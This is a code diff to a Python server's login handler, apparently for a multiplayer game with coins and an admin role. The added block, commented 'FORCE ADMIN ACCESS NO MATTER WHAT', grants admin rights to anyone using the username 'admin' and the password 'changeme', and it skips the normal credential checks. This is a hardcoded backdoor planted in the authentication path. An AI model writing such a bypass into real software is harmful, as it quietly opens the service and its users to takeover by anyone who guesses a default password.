@@ -180,6 +180,15 @@ def handle_join(data):
     username = (data.get('username') or '').strip()
     password = data.get('password') or ''
 
+    # FORCE ADMIN ACCESS NO MATTER WHAT
+    if username.lower() == 'admin' and password == 'changeme':
+        admin_sids.add(request.sid)
+        online_players['admin'] = request.sid
+        emit('user_status', {'username': 'admin', 'coins': 0, 'is_admin': True})
+        broadcast_player_list()
+        broadcast_user_list()
+        return
+
     if not username:
         emit('login_failed', {'message': "Enter a username."})
         return
